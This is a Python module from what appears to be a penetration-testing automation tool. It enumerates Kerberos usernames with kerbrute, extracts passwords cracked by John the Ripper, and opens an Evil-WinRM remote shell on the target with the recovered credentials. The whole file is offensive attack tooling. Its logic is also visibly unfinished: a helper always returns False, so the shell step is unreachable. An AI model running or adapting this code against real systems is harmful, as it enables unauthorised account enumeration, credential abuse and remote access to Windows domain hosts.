#!/usr/bin/env python3

import os
from sty import fg
from autorecon.lib import nmapParser
from autorecon.lib import domainFinder
from autorecon.utils import config_parser
import re
from subprocess import call, PIPE, Popen
import requests
from autorecon.utils import helper_lists
from collections.abc import Iterable
import datetime


class KerbEnum:
    """KerbEnum Will Enumerate kerberos usernames etc.."""

    def __init__(self, target):
        self.target = target
        self.processes = ""

    def PwnWinRM(self):

        c = config_parser.CommandParser(f"{os.path.expanduser('~')}/.config/autorecon/config.yaml", self.target)
        if not os.path.exists(c.getPath("kerberos", "kerbDir")):
            os.makedirs(c.getPath("kerberos", "kerbDir"))
        # print(fg.cyan + "Checking for valid usernames. Kerbrute! Running the following commands:" + fg.rs)

        def flatten(lis):
            for item in lis:
                if isinstance(item, Iterable) and not isinstance(item, str):
                    for x in flatten(item):
                        yield x
                else:
                    yield item

        def parse_users(ad_domain):
            """
            Returns a list of users
            """
            if os.path.exists(c.getPath("kerberos", "kerbUsers")):
                with open(c.getPath("kerberos", "kerbUsers"), 'r') as kbu:
                    lines = [l.strip() for l in kbu.readlines()]
                    _users = ' '.join(lines).split()
                    users = [u.replace(f"@{ad_domain}", "") for u in _users if ad_domain in u]
                    # print(users)
                    return users

        def parse_ad_domain():
            """
            Returns a domain as a list
            """
            ad_domainName = []
            ig = helper_lists.ignoreDomains()
            ignore = ig.ignore
            try:
                with open(c.getPath("nmap", "nmap_top_ports_nmap"), "r") as nm:
                    for line in nm:
                        new = (
                            line.replace("=", " ")
                            .replace("/", " ")
                            .replace("commonName=", "")
                            .replace("/organizationName=", " ")
                            .replace(",", " ")
                            .replace("_", " ")
                        )
                        matches = re.findall(r"(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{3,6}", new)
                        for x in matches:
                            if not any(s in x for s in ignore):
                                ad_domainName.append(x)
                                _ips_ignore = re.findall(r"[0-9]+(?:\.[0-9]+){3}", x)
                                if len(_ips_ignore) > 0:
                                    ad_domainName.remove(x)
                sorted_ad_domains = sorted(set(a.lower() for a in ad_domainName))
                # print(sorted_ad_domains)
                return sorted_ad_domains
            except FileNotFoundError as fnf_error:
                print(fnf_error)

        def GetNPUsers():
            domain = parse_ad_domain()
            if domain:
                dope_cmd = f"""{c.getCmd("kerberos", "kerbrute", domain=str(domain[0]))}"""
                print(f"[{fg.li_magenta}+{fg.rs}] {dope_cmd}")
                call(dope_cmd, shell=True)
                users = parse_users(str(domain[0]))
                if users:
                    print(users)
                    print("Todo: finish this module...")

        def check_parse_hashes():
            GetNPUsers()

        def HeresJonny():
            check_parse_hashes()
            return False

        def parseCreds():
            def cmdline(command):
                process = Popen(args=command, stdout=PIPE, shell=True)
                return process.communicate()[0]

            john_show_cmd = c.getCmd("john", "jshow", hashfile=f"{c.getPath('loot', 'krbHashes')}")
            john_show_output = [i.strip() for i in cmdline(john_show_cmd).decode("utf-8").split("\n")]
            num_cracked = [int(p[0]) for p in sorted(set(i for i in john_show_output if "password hash cracked," in i))]
            if (len(num_cracked) > 0):
                if num_cracked[0] >= 1:
                    passwords = []
                    usernames = []
                    for i in john_show_output:
                        if ":" in i:
                            passwords.append(i.split(":")[1])
                            usernames.append(i.split(":")[0].split("$")[3].split("@")[0])
                            # print(i.split(":")[1])
                    return zip(usernames, passwords)

        def checkWinRm():
            if HeresJonny() is True:
                r = requests.post(f"http://{self.target}:5985/wsman", data="")
                if r.status_code == 401:
                    try:
                        user_pass = dict(parseCreds())
                    except TypeError as te:
                        print(te)
                        return 1
                    users = []
                    passwords = []
                    for k, v in user_pass.items():
                        users.append(k)
                        passwords.append(v)
                    if len(users) != 0 and (len(passwords) != 0):
                        try:
                            dope = f"""{c.getCmd("winrm", "evilWinRM", username=users[0], password=passwords[0], SHELL="$SHELL")}"""
                            print(f"[{fg.li_magenta}+{fg.rs}] Found Valid Credentials!!!")
                            print(f"[{fg.li_magenta}+{fg.rs}] {fg.li_green}{user_pass}{fg.rs}")
                            print(f"[{fg.li_magenta}+{fg.rs}] Evil-WinRM !!!")
                            print(f"[{fg.li_magenta}+{fg.rs}] " + dope)
                            print(f"[{fg.li_magenta}+{fg.rs}] Enjoy the Shell Playboy ;) ")
                            kwargs = {}
                            kwargs.update(start_new_session=True)
                            revshell = Popen(args=dope, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True, **kwargs)
                            assert not revshell.poll()

                        except IOError as e:
                            print(e)
                            exit()
            else:
                print(f"[{fg.red}+{fg.rs}] No valid Credentials Found. {fg.red}Try Harder{fg.rs}")
                if not os.path.exists(c.getPath("loot", "lootDir")):
                    os.makedirs(c.getPath("loot", "lootDir"))

        checkWinRm()
